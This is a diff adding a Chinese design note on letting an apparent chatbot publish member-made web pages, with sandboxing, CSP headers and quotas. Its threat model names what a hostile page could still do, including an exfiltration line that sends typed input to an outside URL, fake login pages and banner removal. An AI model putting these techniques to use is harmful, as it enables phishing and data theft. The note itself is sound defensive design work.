@@ -139,6 +139,30 @@
 
 還沒收的、留在 backlog:工作線的 `[modules.agent.work] daily_tokens`(只剩遊戲導演用,跟工作線一起拿掉)、`[modules.reflect.tidy] budget_tokens`、沙箱附件的 `per_person` / `global`。
 
+## 她能發網頁
+
+> 2026-11-23。一個成員要她做網頁:她寫了 `miyoria.html`、匯出、用 `share` 傳到頻道(會執行的檔案在私訊以外照樣當 `.txt` 傳)。對方要「放在檔案網域上」,連結被拒(`type_not_allowed`:網頁原始檔不做下載連結),但她的結果沒說原因,她就說檔案網域「沒開」,其實有開。owner 的方向:預設能做,限制要說得出擋的是哪種傷害。
+
+- **結果說實話**:`share` 傳了附件但沒附連結時,結果多一句可以轉述的原因(檔案網域沒設定、沒開登入、網頁原始檔不做下載連結而要用 `page_publish`、會執行的檔案、密鑰檢查、今天的額度、範圍太大),`data.link_refused` 是代碼;附件傳不出去、連結也做不了時兩個原因都說。
+- **工具**:`page_publish`(文字執行常駐)、`page_list`、`page_unpublish`(`find_tools` 找得到,`files` 類)。另開工具、不是 `share` 的模式:`share` 在對話裡傳一個檔案,連結是下載;網頁不貼訊息、要在瀏覽器裡顯示,有自己的標頭、橫幅、用相對路徑載入的檔案、幾週的壽命,還要能列出和收回。誰能叫照工作的規則:閘門的 `permit`(`sandbox.workspace`,或羈絆到 `work_min_bond`);每個檔案都要是開口的人自己的產物(他的資料夾匯出的),在這裡看得到;owner 不受「自己的」限制,`page_list` 和 `page_unpublish` 也看得到全部。
+- **網址**:`https://<files origin>/p/<代號>/`,代號是 128 位元的亂數。網頁用到的檔案在同一層底下(`/p/<代號>/style.css`、`/p/<代號>/img/cat.png`):她把每個檔案各自 `workspace_export`,再在 `assets` 裡寫 `{path, artifact}`。只給本人或伺服器成員的網頁先送到會員網站 `/api/member/files/page/<代號>` 登入,再回到 `/p/<代號>/~<票>/`:票放在路徑裡,網頁載入的檔案也帶著它;票只開這一頁、這個人,30 分鐘。
+- **能放的**:網頁本身是 HTML 文字(`.html` / `.htm`,或內容是 HTML);檔案可以是 `.html`(另一頁,也有橫幅)、`.css`、`.js` / `.mjs`、`.json`、`.txt`、`.md`、`.csv`、圖片(送出的是清掉資料的副本)、音訊、影片。PDF、壓縮檔、Office、SVG 檔案不能當網頁的檔案。字型產物庫不收(要加 woff / woff2 / ttf / otf 的型別判斷),用 CSS 裡的 `data:` 就好。
+- **要擋的傷害,只有這些**:
+  1. 碰到面板或我們的東西:只在檔案網域(不是面板的主機),那裡沒有 cookie;每個回應都是 `Content-Security-Policy` 的 `sandbox allow-scripts allow-popups allow-modals allow-pointer-lock`(沒有 `allow-same-origin`、`allow-forms`、`allow-top-navigation`),網頁跑在自己的不透明來源,讀不到這個主機的其他網頁和檔案;`X-Frame-Options: DENY`、`frame-ancestors 'none'`。
+  2. 在 owner 的網域上釣魚、偷資料:`default-src 'none'`、`script-src 'unsafe-inline' <本頁>`、`style-src 'unsafe-inline' <本頁>`、`img-src` 和 `media-src` 是 `<本頁> data: blob:`、`font-src <本頁> data:`、`connect-src 'none'`、`form-action 'none'`、`frame-src 'none'`、`child-src` / `worker-src` / `object-src` / `manifest-src 'none'`、`base-uri 'none'`;`<本頁>` 是 `https://<files origin>/p/<代號>/`,別的網頁的檔案也載不到。`<a href>` 的外部連結點了照樣會開,這是要的。伺服器在每頁 `<body>` 的第一個位置放一條固定在最上面的橫幅(行內樣式加 `!important`、每次不同的 id),中英文寫「這是成員請她幫忙做的,不是官方網站,不要在這裡輸入任何密碼」。
+  3. 誰打得開:跟連結一樣,本人(`to` speaker)或伺服器成員(`here`)登入後;`[modules.api.files] pages_public = true` 時才可以 `anyone`(不用登入,而且只限開口的人自己的東西)。
+  4. 空間和流量:網頁和連結一起算 `links_per_person_per_day`,也算 `share` 每天的次數;HTML 最大 `page_max_kb`(預設 2048)、加上檔案合計 `page_total_max_kb`(預設 8192);`page_days` 天後下架(預設 30,最多 `page_max_days`,預設 90),網頁用到的產物延長到同一天;`page_unpublish` 馬上失效。HTML 和每個文字檔發之前、送出時都過密鑰檢查。
+  5. 搜尋引擎:`X-Robots-Tag: noindex, nofollow`。
+  另外每個回應都有 `X-Content-Type-Options: nosniff`、`Referrer-Policy: no-referrer`、`Cross-Origin-Resource-Policy: same-site`、`Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(), usb=()`。只有 `/p/` 會回 `text/html`;`/f/` 的連結和 `/d/` 的下載從來不會。
+- **惡意網頁還做得到的**:
+  - 用程式讀訪客打的字,再讓自己換頁(`location = "https://別處/?q=..."`)或開新視窗(`allow-popups`)把資料放在網址裡帶走:CSP 擋不了頁面自己換頁(`navigate-to` 已經從標準拿掉)。表單送不出去、連不了線,但假的登入頁還是能這樣偷到密碼;能擋的只剩橫幅。
+  - 用程式拿掉橫幅,或疊一個東西蓋住它。
+  - 誤導人的內容、指向別處的釣魚或惡意下載的連結(要人點)。
+  - 吃訪客的 CPU 和記憶體、一直跳對話框、鎖滑鼠。
+  - 只給特定的人的網頁,網址裡的票網頁的程式讀得到,帶出去的話別人 30 分鐘內也打得開這一頁(就是這一頁本身)。
+  - 不支援 CSP `sandbox` 標頭的很舊的瀏覽器會把網頁當成檔案網域本身來跑;那裡沒有 cookie,能碰到的只有同一個網域上別的網頁和檔案。
+- **資料庫**:`artifact` 外掛的第 2 個 migration `pages`,只新增 `artifact_pages`、`artifact_page_assets` 兩張表和三個索引,不動舊表。
+
 ## 不做的
 
 - 讓她直接在主機上跑指令(沒有沙箱的 shell)。
